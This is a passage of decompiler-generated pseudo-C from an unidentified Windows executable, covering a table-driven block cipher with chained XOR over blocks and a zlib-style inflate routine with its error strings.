          puVar5 = (uint *)(param_1_00 + 0x434);
          local_14 = iVar3;
          do {
            local_2c = (uint)*(byte *)(param_1_00 + 0x455 + ((local_24 + (int)param_1) % iVar3) * 4)
            ;
            puVar2 = local_8 + 1;
            *puVar5 = *(uint *)(&DAT_0040a3fc + local_2c * 4) ^
                      *(uint *)(&DAT_0040a7fc +
                               (*(uint *)(param_1_00 + 0x454 +
                                         ((local_28 + (int)param_1) % iVar3) * 4) & 0xff) * 4) ^
                      *(uint *)(&DAT_00409ffc +
                               (uint)*(byte *)(param_1_00 + 0x456 + ((int)param_1 % iVar3) * 4) * 4)
                      ^ *(uint *)(&DAT_00409bfc + (uint)*(byte *)((int)puVar5 + 0x23) * 4) ^
                      *local_8;
            puVar5 = puVar5 + 1;
            param_1 = (byte *)((int)param_1 + 1);
            local_14 = local_14 + -1;
            local_8 = puVar2;
          } while (local_14 != 0);
        }
        memcpy((void *)(param_1_00 + 0x454),(void *)(param_1_00 + 0x434),iVar3 << 2);
        local_c = local_c + 8;
        local_10 = local_10 + 1;
      } while (local_10 < *(int *)(param_1_00 + 0x410));
    }
    local_8 = (uint *)0x0;
    if (0 < iVar3) {
      local_1c = local_1c - local_18;
      local_20 = local_20 - local_18;
      pbVar6 = param_2;
      param_2 = (byte *)(param_1_00 + 0x454);
      do {
        uVar1 = *(undefined4 *)
                 (param_1_00 + 0x1e8 + ((int)local_8 + *(int *)(param_1_00 + 0x410) * 8) * 4);
        *pbVar6 = (&DAT_00408afc)[*(byte *)((int)param_2 + 3)] ^ (byte)((uint)uVar1 >> 0x18);
        pbVar6[1] = (&DAT_00408afc)
                    [*(byte *)(param_1_00 + 0x456 + ((local_1c + local_18) % iVar3) * 4)] ^
                    (byte)((uint)uVar1 >> 0x10);
        pbVar6[2] = (&DAT_00408afc)[*(byte *)(param_1_00 + 0x455 + (local_18 % iVar3) * 4)] ^
                    (byte)((uint)uVar1 >> 8);
        param_1._0_1_ = (byte)uVar1;
        pbVar6[3] = (&DAT_00408afc)
                    [*(uint *)(param_1_00 + 0x454 + ((local_20 + local_18) % iVar3) * 4) & 0xff] ^
                    (byte)param_1;
        pbVar6 = pbVar6 + 4;
        local_8 = (uint *)((int)local_8 + 1);
        local_18 = local_18 + 1;
        param_2 = (byte *)((int)param_2 + 4);
      } while ((int)local_8 < iVar3);
    }
  }
  return;
}



void __thiscall FUN_00403a28(int param_1_00,byte *param_1,byte *param_2)

{
  int iVar1;
  exception local_10 [12];
  
  if (*(char *)(param_1_00 + 4) != '\0') {
    iVar1 = 0;
    if (0 < *(int *)(param_1_00 + 0x3cc)) {
      do {
        *param_1 = *param_1 ^ *param_2;
        param_2 = param_2 + 1;
        param_1 = param_1 + 1;
        iVar1 = iVar1 + 1;
      } while (iVar1 < *(int *)(param_1_00 + 0x3cc));
    }
    return;
  }
  exception::exception(local_10,&PTR_DAT_0040f570);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_10,(ThrowInfo *)&DAT_0040d570);
}



void __thiscall FUN_00403a77(int param_1_00,void *param_1,int param_2,uint param_3,uint param_4)

{
  uint uVar1;
  bool bVar2;
  exception local_10 [12];
  
  if (*(char *)(param_1_00 + 4) == '\0') {
    exception::exception(local_10,&PTR_DAT_0040f570);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_10,(ThrowInfo *)&DAT_0040d570);
  }
  if (param_3 != 0) {
    uVar1 = *(uint *)(param_1_00 + 0x3cc);
    if ((int)((ulonglong)param_3 % (ulonglong)uVar1) == 0) {
      if (param_4 == 1) {
        param_4 = 0;
        if ((int)(((ulonglong)param_3 % (ulonglong)uVar1 << 0x20 | (ulonglong)param_3) /
                 (ulonglong)uVar1) != 0) {
          do {
            FUN_00403797(param_1,param_2);
            FUN_00403a28(param_2,param_1_00 + 0x3f0);
            memcpy((void *)(param_1_00 + 0x3f0),param_1,*(size_t *)(param_1_00 + 0x3cc));
            uVar1 = *(uint *)(param_1_00 + 0x3cc);
            param_1 = (void *)((int)param_1 + uVar1);
            param_2 = param_2 + uVar1;
            param_4 = param_4 + 1;
          } while (param_4 < param_3 / uVar1);
        }
      }
      else {
        bVar2 = param_4 == 2;
        param_4 = 0;
        if (bVar2) {
          if (param_3 / uVar1 != 0) {
            do {
              FUN_0040350f(param_1_00 + 0x3f0,param_2);
              FUN_00403a28(param_2,param_1);
              memcpy((void *)(param_1_00 + 0x3f0),param_1,*(size_t *)(param_1_00 + 0x3cc));
              uVar1 = *(uint *)(param_1_00 + 0x3cc);
              param_1 = (void *)((int)param_1 + uVar1);
              param_2 = param_2 + uVar1;
              param_4 = param_4 + 1;
            } while (param_4 < param_3 / uVar1);
          }
        }
        else if (param_3 / uVar1 != 0) {
          do {
            FUN_00403797(param_1,param_2);
            uVar1 = *(uint *)(param_1_00 + 0x3cc);
            param_1 = (void *)((int)param_1 + uVar1);
            param_2 = param_2 + uVar1;
            param_4 = param_4 + 1;
          } while (param_4 < param_3 / uVar1);
        }
      }
      return;
    }
  }
  exception::exception(local_10,&PTR_DAT_0040f574);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_10,(ThrowInfo *)&DAT_0040d570);
}



int FUN_00403bd6(int param_1,void *param_2,int param_3)

{
  void *_Src;
  uint uVar1;
  int iVar2;
  undefined4 uVar3;
  void *pvVar4;
  uint uVar5;
  void *local_8;
  
  iVar2 = (int)param_2;
  _Src = *(void **)(param_1 + 0x30);
  pvVar4 = *(void **)(param_1 + 0x34);
  local_8 = *(void **)((int)param_2 + 0xc);
  if (pvVar4 < _Src) {
    pvVar4 = *(void **)(param_1 + 0x2c);
  }
  uVar1 = *(uint *)((int)param_2 + 0x10);
  uVar5 = (int)pvVar4 - (int)_Src;
  if (uVar1 < (uint)((int)pvVar4 - (int)_Src)) {
    uVar5 = uVar1;
  }
  if ((uVar5 != 0) && (param_3 == -5)) {
    param_3 = 0;
  }
  *(int *)((int)param_2 + 0x14) = *(int *)((int)param_2 + 0x14) + uVar5;
  *(uint *)((int)param_2 + 0x10) = uVar1 - uVar5;
  if (*(code **)(param_1 + 0x38) != (code *)0x0) {
    uVar3 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),_Src,uVar5);
    *(undefined4 *)(param_1 + 0x3c) = uVar3;
    *(undefined4 *)((int)param_2 + 0x30) = uVar3;
  }
  param_2 = _Src;
  if (uVar5 != 0) {
    memcpy(local_8,_Src,uVar5);
    local_8 = (void *)((int)local_8 + uVar5);
    param_2 = (void *)((int)_Src + uVar5);
  }
  if (param_2 == *(void **)(param_1 + 0x2c)) {
    param_2 = *(void **)(param_1 + 0x28);
    if (*(void **)(param_1 + 0x34) == *(void **)(param_1 + 0x2c)) {
      *(void **)(param_1 + 0x34) = param_2;
    }
    uVar1 = *(uint *)(iVar2 + 0x10);
    uVar5 = *(int *)(param_1 + 0x34) - (int)param_2;
    if (uVar1 < uVar5) {
      uVar5 = uVar1;
    }
    if ((uVar5 != 0) && (param_3 == -5)) {
      param_3 = 0;
    }
    *(int *)(iVar2 + 0x14) = *(int *)(iVar2 + 0x14) + uVar5;
    *(uint *)(iVar2 + 0x10) = uVar1 - uVar5;
    if (*(code **)(param_1 + 0x38) != (code *)0x0) {
      uVar3 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),param_2,uVar5);
      *(undefined4 *)(param_1 + 0x3c) = uVar3;
      *(undefined4 *)(iVar2 + 0x30) = uVar3;
    }
    if (uVar5 != 0) {
      memcpy(local_8,param_2,uVar5);
      local_8 = (void *)((int)local_8 + uVar5);
      param_2 = (void *)((int)param_2 + uVar5);
    }
  }
  *(void **)(iVar2 + 0xc) = local_8;
  *(void **)(param_1 + 0x30) = param_2;
  return param_3;
}



void FUN_00403cc8(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4,
                 int param_5)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = 0;
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}



void FUN_00403cfc(uint param_1,byte **param_2,int param_3)

{
  int *piVar1;
  byte bVar2;
  int *piVar3;
  undefined *puVar4;
  byte *pbVar5;
  int iVar6;
  int iVar7;
  byte **ppbVar8;
  uint uVar9;
  undefined *puVar10;
  undefined *puVar11;
  byte *local_18;
  undefined *local_14;
  undefined *local_10;
  byte *local_c;
  byte *local_8;
  
  ppbVar8 = param_2;
  iVar7 = param_1;
  local_8 = *param_2;
  local_c = param_2[1];
  puVar11 = *(undefined **)(param_1 + 0x34);
  param_2 = *(byte ***)(param_1 + 0x20);
  piVar3 = *(int **)(param_1 + 4);
  if (puVar11 < *(undefined **)(param_1 + 0x30)) {
    local_10 = *(undefined **)(param_1 + 0x30) + (-1 - (int)puVar11);
    param_1 = *(uint *)(param_1 + 0x1c);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_1 + 0x2c) - (int)puVar11);
    param_1 = *(uint *)(param_1 + 0x1c);
  }
  do {
    switch(*piVar3) {
    case 0:
      if (((undefined *)0x101 < local_10) && ((byte *)0x9 < local_c)) {
        *(byte ***)(iVar7 + 0x20) = param_2;
        *(uint *)(iVar7 + 0x1c) = param_1;
        ppbVar8[1] = local_c;
        pbVar5 = *ppbVar8;
        *ppbVar8 = local_8;
        ppbVar8[2] = ppbVar8[2] + ((int)local_8 - (int)pbVar5);
        *(undefined **)(iVar7 + 0x34) = puVar11;
        param_3 = FUN_0040514d(*(undefined *)(piVar3 + 4),*(undefined *)((int)piVar3 + 0x11),
                               piVar3[5],piVar3[6],iVar7,ppbVar8);
        local_8 = *ppbVar8;
        local_c = ppbVar8[1];
        puVar11 = *(undefined **)(iVar7 + 0x34);
        param_2 = *(byte ***)(iVar7 + 0x20);
        param_1 = *(uint *)(iVar7 + 0x1c);
        if (puVar11 < *(undefined **)(iVar7 + 0x30)) {
          local_10 = *(undefined **)(iVar7 + 0x30) + (-1 - (int)puVar11);
        }
        else {
          local_10 = (undefined *)(*(int *)(iVar7 + 0x2c) - (int)puVar11);
        }
        if (param_3 != 0) {
          *piVar3 = (-(uint)(param_3 != 1) & 2) + 7;
          break;
        }
      }
      piVar3[3] = (uint)*(byte *)(piVar3 + 4);
      piVar3[2] = piVar3[5];
      *piVar3 = 1;
    case 1:
      for (; param_1 < (uint)piVar3[3]; param_1 = param_1 + 8) {
        if (local_c == (byte *)0x0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c + -1;
        param_2 = (byte **)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
      }
      local_18 = (byte *)(piVar3[2] + (*(uint *)(&DAT_0040bca8 + piVar3[3] * 4) & (uint)param_2) * 8
                         );
      param_2 = (byte **)((uint)param_2 >> (local_18[1] & 0x1f));
      param_1 = param_1 - local_18[1];
      bVar2 = *local_18;
      uVar9 = (uint)bVar2;
      if (uVar9 == 0) {
        iVar6 = *(int *)(local_18 + 4);
        *piVar3 = 6;
        piVar3[2] = iVar6;
      }
      else if ((bVar2 & 0x10) == 0) {
        if ((bVar2 & 0x40) == 0) {
LAB_00403f71:
          piVar3[3] = uVar9;
          piVar3[2] = (int)(local_18 + *(int *)(local_18 + 4) * 8);
        }
        else {
          if ((bVar2 & 0x20) == 0) {
            *piVar3 = 9;
            ppbVar8[6] = (byte *)s_invalid_literal_length_code_0040f630;
switchD_00403d47_caseD_9:
            param_3 = -3;
            *(byte ***)(iVar7 + 0x20) = param_2;
            *(uint *)(iVar7 + 0x1c) = param_1;
            ppbVar8[1] = local_c;
            pbVar5 = *ppbVar8;
            *ppbVar8 = local_8;
            ppbVar8[2] = ppbVar8[2] + ((int)local_8 - (int)pbVar5);
            *(undefined **)(iVar7 + 0x34) = puVar11;
            goto LAB_00404278;
          }
          *piVar3 = 7;
        }
      }
      else {
        piVar3[2] = uVar9 & 0xf;
        piVar3[1] = *(int *)(local_18 + 4);
        *piVar3 = 2;
      }
      break;
    case 2:
      for (; param_1 < (uint)piVar3[2]; param_1 = param_1 + 8) {
        if (local_c == (byte *)0x0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c + -1;
        param_2 = (byte **)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
      }
      uVar9 = *(uint *)(&DAT_0040bca8 + piVar3[2] * 4) & (uint)param_2;
      *piVar3 = 3;
      param_2 = (byte **)((uint)param_2 >> ((byte)piVar3[2] & 0x1f));
      piVar3[1] = piVar3[1] + uVar9;
      param_1 = param_1 - piVar3[2];
      piVar3[3] = (uint)*(byte *)((int)piVar3 + 0x11);
      piVar3[2] = piVar3[6];
    case 3:
      for (; param_1 < (uint)piVar3[3]; param_1 = param_1 + 8) {
        if (local_c == (byte *)0x0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c + -1;
        param_2 = (byte **)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
      }
      local_18 = (byte *)(piVar3[2] + (*(uint *)(&DAT_0040bca8 + piVar3[3] * 4) & (uint)param_2) * 8
                         );
      param_2 = (byte **)((uint)param_2 >> (local_18[1] & 0x1f));
      param_1 = param_1 - local_18[1];
      bVar2 = *local_18;
      uVar9 = (uint)bVar2;
      if ((bVar2 & 0x10) == 0) {
        if ((bVar2 & 0x40) == 0) goto LAB_00403f71;
        *piVar3 = 9;
        ppbVar8[6] = (byte *)s_invalid_distance_code_0040f618;
        goto switchD_00403d47_caseD_9;
      }
      piVar3[2] = uVar9 & 0xf;
      piVar3[3] = *(int *)(local_18 + 4);
      *piVar3 = 4;
      break;
    case 4:
      for (; param_1 < (uint)piVar3[2]; param_1 = param_1 + 8) {
        if (local_c == (byte *)0x0) goto LAB_0040415f;
        param_3 = 0;
        local_c = local_c + -1;
        param_2 = (byte **)((uint)param_2 | (uint)*local_8 << ((byte)param_1 & 0x1f));
        local_8 = local_8 + 1;
      }
      uVar9 = *(uint *)(&DAT_0040bca8 + piVar3[2] * 4) & (uint)param_2;
      *piVar3 = 5;
      param_2 = (byte **)((uint)param_2 >> ((byte)piVar3[2] & 0x1f));
      piVar3[3] = piVar3[3] + uVar9;
      param_1 = param_1 - piVar3[2];
    case 5:
      local_14 = puVar11 + -piVar3[3];
      if (local_14 < *(undefined **)(iVar7 + 0x28)) {
        do {
          local_14 = local_14 + (*(int *)(iVar7 + 0x2c) - (int)*(undefined **)(iVar7 + 0x28));
        } while (local_14 < *(undefined **)(iVar7 + 0x28));
      }
      iVar6 = piVar3[1];
      while (iVar6 != 0) {
        puVar10 = puVar11;
        if (local_10 == (undefined *)0x0) {
          if (puVar11 == *(undefined **)(iVar7 + 0x2c)) {
            local_10 = *(undefined **)(iVar7 + 0x30);
            puVar10 = *(undefined **)(iVar7 + 0x28);
            if (local_10 != puVar10) {
              if (puVar10 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar10);
              }
              else {
                local_10 = *(undefined **)(iVar7 + 0x2c) + -(int)puVar10;
              }
              puVar11 = puVar10;
              if (local_10 != (undefined *)0x0) goto LAB_00404090;
            }
          }
          *(undefined **)(iVar7 + 0x34) = puVar11;
          param_3 = FUN_00403bd6(iVar7,ppbVar8,param_3);
          puVar10 = *(undefined **)(iVar7 + 0x34);
          puVar11 = *(undefined **)(iVar7 + 0x30);
          if (puVar10 < puVar11) {
            local_10 = puVar11 + (-1 - (int)puVar10);
          }
          else {
            local_10 = (undefined *)(*(int *)(iVar7 + 0x2c) - (int)puVar10);
          }
          if ((puVar10 == *(undefined **)(iVar7 + 0x2c)) &&
             (puVar4 = *(undefined **)(iVar7 + 0x28), puVar11 != puVar4)) {
            puVar10 = puVar4;
            if (puVar4 < puVar11) {
              local_10 = puVar11 + (-1 - (int)puVar4);
            }
            else {
              local_10 = *(undefined **)(iVar7 + 0x2c) + -(int)puVar4;
            }
          }
          if (local_10 == (undefined *)0x0) goto LAB_004041b5;
        }
LAB_00404090:
        param_3 = 0;
        *puVar10 = *local_14;
        puVar11 = puVar10 + 1;
        local_14 = local_14 + 1;
        local_10 = local_10 + -1;
        if (local_14 == *(undefined **)(iVar7 + 0x2c)) {
          local_14 = *(undefined **)(iVar7 + 0x28);
        }
        piVar1 = piVar3 + 1;
        *piVar1 = *piVar1 + -1;
        iVar6 = *piVar1;
      }
LAB_00404157:
      *piVar3 = 0;
      break;
    case 6:
      puVar10 = puVar11;
      if (local_10 != (undefined *)0x0) {
LAB_00404149:
        param_3 = 0;
        *puVar10 = *(undefined *)(piVar3 + 2);
        puVar11 = puVar10 + 1;
        local_10 = local_10 + -1;
        goto LAB_00404157;
      }
      if (puVar11 == *(undefined **)(iVar7 + 0x2c)) {
        local_10 = *(undefined **)(iVar7 + 0x30);
        puVar10 = *(undefined **)(iVar7 + 0x28);
        if (local_10 != puVar10) {
          if (puVar10 < local_10) {
            local_10 = local_10 + (-1 - (int)puVar10);
          }
          else {
            local_10 = *(undefined **)(iVar7 + 0x2c) + -(int)puVar10;
          }
          puVar11 = puVar10;
          if (local_10 != (undefined *)0x0) goto LAB_00404149;
        }
      }
      *(undefined **)(iVar7 + 0x34) = puVar11;
      param_3 = FUN_00403bd6(iVar7,ppbVar8,param_3);
      puVar10 = *(undefined **)(iVar7 + 0x34);
      puVar11 = *(undefined **)(iVar7 + 0x30);
      if (puVar10 < puVar11) {
        local_10 = puVar11 + (-1 - (int)puVar10);
      }
      else {
        local_10 = (undefined *)(*(int *)(iVar7 + 0x2c) - (int)puVar10);
      }
      if ((puVar10 == *(undefined **)(iVar7 + 0x2c)) &&
         (puVar4 = *(undefined **)(iVar7 + 0x28), puVar11 != puVar4)) {
        puVar10 = puVar4;
        if (puVar4 < puVar11) {
          local_10 = puVar11 + (-1 - (int)puVar4);
        }
        else {
          local_10 = *(undefined **)(iVar7 + 0x2c) + -(int)puVar4;
        }
      }
      if (local_10 != (undefined *)0x0) goto LAB_00404149;
LAB_004041b5:
      *(byte ***)(iVar7 + 0x20) = param_2;
      *(uint *)(iVar7 + 0x1c) = param_1;
      ppbVar8[1] = local_c;
      puVar11 = puVar10;
      goto LAB_004041c7;
    case 7:
      if (7 < param_1) {
        param_1 = param_1 - 8;
        local_c = local_c + 1;
        local_8 = local_8 + -1;
      }
      *(undefined **)(iVar7 + 0x34) = puVar11;
      param_3 = FUN_00403bd6(iVar7,ppbVar8,param_3);
      puVar11 = *(undefined **)(iVar7 + 0x34);
      if (*(undefined **)(iVar7 + 0x30) == puVar11) {
        *piVar3 = 8;
switchD_00403d47_caseD_8:
        param_3 = 1;
        *(byte ***)(iVar7 + 0x20) = param_2;
        *(uint *)(iVar7 + 0x1c) = param_1;
        ppbVar8[1] = local_c;
        pbVar5 = *ppbVar8;
        *ppbVar8 = local_8;
        ppbVar8[2] = ppbVar8[2] + ((int)local_8 - (int)pbVar5);
        *(undefined **)(iVar7 + 0x34) = puVar11;
      }
      else {
        *(byte ***)(iVar7 + 0x20) = param_2;
        *(uint *)(iVar7 + 0x1c) = param_1;
        ppbVar8[1] = local_c;
        pbVar5 = *ppbVar8;
        *ppbVar8 = local_8;
        ppbVar8[2] = ppbVar8[2] + ((int)local_8 - (int)pbVar5);
        *(undefined **)(iVar7 + 0x34) = puVar11;
      }
LAB_00404278:
      FUN_00403bd6(iVar7,ppbVar8,param_3);
      return;
    case 8:
      goto switchD_00403d47_caseD_8;
    case 9:
      goto switchD_00403d47_caseD_9;
    default:
      param_3 = -2;
      *(byte ***)(iVar7 + 0x20) = param_2;
      *(uint *)(iVar7 + 0x1c) = param_1;
      ppbVar8[1] = local_c;
      pbVar5 = *ppbVar8;
      *ppbVar8 = local_8;
      ppbVar8[2] = ppbVar8[2] + ((int)local_8 - (int)pbVar5);
      *(undefined **)(iVar7 + 0x34) = puVar11;
      goto LAB_00404278;
    }
  } while( true );
LAB_0040415f:
  *(byte ***)(iVar7 + 0x20) = param_2;
  *(uint *)(iVar7 + 0x1c) = param_1;
  ppbVar8[1] = (byte *)0x0;
LAB_004041c7:
  pbVar5 = *ppbVar8;
  *ppbVar8 = local_8;
  ppbVar8[2] = ppbVar8[2] + ((int)local_8 - (int)pbVar5);
  *(undefined **)(iVar7 + 0x34) = puVar11;
  goto LAB_00404278;
}



void FUN_004042af(undefined4 param_1,int param_2)

{
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return;
}



void FUN_004042c0(int *param_1,int param_2,int *param_3)

{
  int iVar1;
  
  if (param_3 != (int *)0x0) {
    *param_3 = param_1[0xf];
  }
  if ((*param_1 == 4) || (*param_1 == 5)) {
    (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[3]);
  }
  if (*param_1 == 6) {
    FUN_004042af(param_1[1],param_2);
  }
  *param_1 = 0;
  param_1[0xd] = param_1[10];
  param_1[0xc] = param_1[10];
  param_1[7] = 0;
  param_1[8] = 0;
  if ((code *)param_1[0xe] != (code *)0x0) {
    iVar1 = (*(code *)param_1[0xe])(0,0,0);
    param_1[0xf] = iVar1;
    *(int *)(param_2 + 0x30) = iVar1;
  }
  return;
}



undefined4 * FUN_0040432b(int param_1,undefined4 param_2,int param_3)

{
  undefined4 *puVar1;
  int iVar2;
  
  puVar1 = (undefined4 *)(**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x40);
  if (puVar1 != (undefined4 *)0x0) {
    iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),8,0x5a0);
    puVar1[9] = iVar2;
    if (iVar2 == 0) {
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),puVar1);
    }
    else {
      iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,param_3);
      puVar1[10] = iVar2;
      if (iVar2 != 0) {
        *puVar1 = 0;
        puVar1[0xb] = iVar2 + param_3;
        puVar1[0xe] = param_2;
        FUN_004042c0(puVar1,param_1,0);
        return puVar1;
      }
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),puVar1[9]);
      (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),puVar1);
    }
  }
  return (undefined4 *)0x0;
}



// WARNING: Type propagation algorithm not settling

void FUN_004043b6(uint *param_1,byte **param_2,byte *param_3)

{
  uint *puVar1;
  byte bVar2;
  byte *pbVar3;
  byte *pbVar4;
  uint *puVar5;
  byte **ppbVar6;
  int iVar7;
  undefined4 uVar8;
  uint uVar9;
  byte *_Src;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  uint local_18;
  byte *local_14;
  byte *local_10;
  byte *local_c;
  byte *local_8;
  
  ppbVar6 = param_2;
  puVar5 = param_1;
  local_c = (byte *)param_1[0xd];
  local_8 = param_2[1];
  _Src = *param_2;
  param_2 = (byte **)param_1[7];
  if (local_c < (byte *)param_1[0xc]) {
    local_14 = (byte *)param_1[0xc] + (-1 - (int)local_c);
  }
  else {
    local_14 = (byte *)(param_1[0xb] - (int)local_c);
  }
  uVar9 = *param_1;
  param_1 = (uint *)param_1[8];
  while (uVar9 < 10) {
    switch((&switchD_00404408::switchdataD_00404bbd)[uVar9]) {
    case (undefined *)0x40440f:
      for (; param_2 < (byte *)0x3; param_2 = (byte **)((int)param_2 + 8)) {
        if (local_8 == (byte *)0x0) goto LAB_00404a58;
        param_3 = (byte *)0x0;
        local_8 = local_8 + -1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        _Src = _Src + 1;
      }
      uVar9 = ((uint)param_1 & 7) >> 1;
      puVar5[6] = (uint)param_1 & 1;
      if (uVar9 == 0) {
        *puVar5 = 1;
        uVar9 = (uint)(byte *)((int)param_2 + -3) & 7;
        param_1 = (uint *)(((uint)param_1 >> 3) >> (sbyte)uVar9);
        param_2 = (byte **)((byte *)((int)param_2 + -3) + -uVar9);
        break;
      }
      if (uVar9 == 1) {
        FUN_00405122(&local_28,&local_24,&local_20,&local_1c,ppbVar6);
        uVar9 = FUN_00403cc8(local_28,local_24,local_20,local_1c,ppbVar6);
        puVar5[1] = uVar9;
        if (uVar9 == 0) goto LAB_00404b1c;
        param_1 = (uint *)((uint)param_1 >> 3);
        param_2 = (byte **)((int)param_2 + -3);
        *puVar5 = 6;
        break;
      }
      if (uVar9 == 2) {
        param_1 = (uint *)((uint)param_1 >> 3);
        uVar9 = 3;
        param_2 = (byte **)((int)param_2 + -3);
        goto LAB_00404469;
      }
      if (uVar9 != 3) break;
      *puVar5 = 9;
      ppbVar6[6] = (byte *)s_invalid_block_type_0040f6ac;
      puVar5[8] = (uint)param_1 >> 3;
      param_2 = (byte **)((int)param_2 + -3);
      goto LAB_00404a28;
    case (undefined *)0x4044dc:
      for (; param_2 < (byte *)0x20; param_2 = (byte **)((int)param_2 + 8)) {
        if (local_8 == (byte *)0x0) goto LAB_00404a58;
        param_3 = (byte *)0x0;
        local_8 = local_8 + -1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        _Src = _Src + 1;
      }
      if (~(uint)param_1 >> 0x10 != ((uint)param_1 & 0xffff)) {
        *puVar5 = 9;
        ppbVar6[6] = (byte *)s_invalid_stored_block_lengths_0040f68c;
        goto switchD_00404408_caseD_404a1f;
      }
      puVar5[1] = (uint)param_1 & 0xffff;
      param_2 = (byte **)0x0;
      param_1 = (uint *)0x0;
      if (puVar5[1] == 0) goto LAB_0040461c;
      uVar9 = 2;
LAB_00404469:
      *puVar5 = uVar9;
      break;
    case (undefined *)0x40453a:
      if (local_8 == (byte *)0x0) {
LAB_00404a58:
        puVar5[8] = (uint)param_1;
        puVar5[7] = (uint)param_2;
        ppbVar6[1] = (byte *)0x0;
LAB_00404a68:
        pbVar4 = *ppbVar6;
        *ppbVar6 = _Src;
        ppbVar6[2] = ppbVar6[2] + ((int)_Src - (int)pbVar4);
        puVar5[0xd] = (uint)local_c;
        goto LAB_004049e5;
      }
      if (local_14 == (byte *)0x0) {
        if (local_c == (byte *)puVar5[0xb]) {
          pbVar4 = (byte *)puVar5[0xc];
          pbVar3 = (byte *)puVar5[10];
          if (pbVar3 != pbVar4) {
            if (pbVar3 < pbVar4) {
              local_14 = pbVar4 + (-1 - (int)pbVar3);
            }
            else {
              local_14 = (byte *)puVar5[0xb] + -(int)pbVar3;
            }
            local_c = pbVar3;
            if (local_14 != (byte *)0x0) goto LAB_004045d7;
          }
        }
        puVar5[0xd] = (uint)local_c;
        param_3 = (byte *)FUN_00403bd6(puVar5,ppbVar6,param_3);
        pbVar4 = (byte *)puVar5[0xc];
        local_c = (byte *)puVar5[0xd];
        if (local_c < pbVar4) {
          local_14 = pbVar4 + (-1 - (int)local_c);
        }
        else {
          local_14 = (byte *)(puVar5[0xb] - (int)local_c);
        }
        if (local_c == (byte *)puVar5[0xb]) {
          pbVar3 = (byte *)puVar5[10];
          if (pbVar3 != pbVar4) {
            local_c = pbVar3;
            if (pbVar3 < pbVar4) {
              local_14 = pbVar4 + (-1 - (int)pbVar3);
            }
            else {
              local_14 = (byte *)puVar5[0xb] + -(int)pbVar3;
            }
          }
        }
        if (local_14 == (byte *)0x0) {
          puVar5[8] = (uint)param_1;
          puVar5[7] = (uint)param_2;
          ppbVar6[1] = local_8;
          goto LAB_00404a68;
        }
      }
LAB_004045d7:
      local_10 = (byte *)puVar5[1];
      param_3 = (byte *)0x0;
      if (local_8 < local_10) {
        local_10 = local_8;
      }
      if (local_14 < local_10) {
        local_10 = local_14;
      }
      memcpy(local_c,_Src,(size_t)local_10);
      local_8 = local_8 + -(int)local_10;
      local_c = local_c + (int)local_10;
      local_14 = local_14 + -(int)local_10;
      _Src = _Src + (int)local_10;
      puVar1 = puVar5 + 1;
      *puVar1 = *puVar1 - (int)local_10;
      if (*puVar1 == 0) {
LAB_0040461c:
        uVar9 = -(uint)(puVar5[6] != 0) & 7;
        goto LAB_00404469;
      }
      break;
    case (undefined *)0x40462b:
      for (; param_2 < (byte *)0xe; param_2 = (byte **)((int)param_2 + 8)) {
        if (local_8 == (byte *)0x0) goto LAB_00404a58;
        param_3 = (byte *)0x0;
        local_8 = local_8 + -1;
        param_1 = (uint *)((uint)param_1 | (uint)*_Src << ((byte)param_2 & 0x1f));
        _Src = _Src + 1;
      }
      puVar5[1] = (uint)param_1 & 0x3fff;
      if ((0x1d < ((uint)param_1 & 0x1f)) || (0x3a0 < ((uint)param_1 & 0x3e0))) {
        *puVar5 = 9;
        ppbVar6[6] = (byte *)s_too_many_length_or_distance_symb_0040f668;
        goto switchD_00404408_caseD_404a1f;
      }
      uVar9 = (*(code *)ppbVar6[8])
                        (ppbVar6[10],
                         (((uint)param_1 & 0x3fff) >> 5 & 0x1f) + 0x102 + ((uint)param_1 & 0x1f),4);
      puVar5[3] = uVar9;
      if (uVar9 != 0) {
        param_1 = (uint *)((uint)param_1 >> 0xe);
        param_2 = (byte **)((int)param_2 + -0xe);
        puVar5[2] = 0;
        *puVar5 = 4;
        goto switchD_00404408_caseD_4046b8;
      }
LAB_00404b1c:
      param_3 = (byte *)0xfffffffc;
      puVar5[8] = (uint)param_1;
      puVar5[7] = (uint)param_2;
      ppbVar6[1] = local_8;
      pbVar4 = *ppbVar6;
      *ppbVar6 = _Src;
      ppbVar6[2] = ppbVar6[2] + ((int)_Src - (int)pbVar4);
      puVar5[0xd] = (uint)local_c;
      goto LAB_004049e5;
    case (undefined *)0x4046b8:
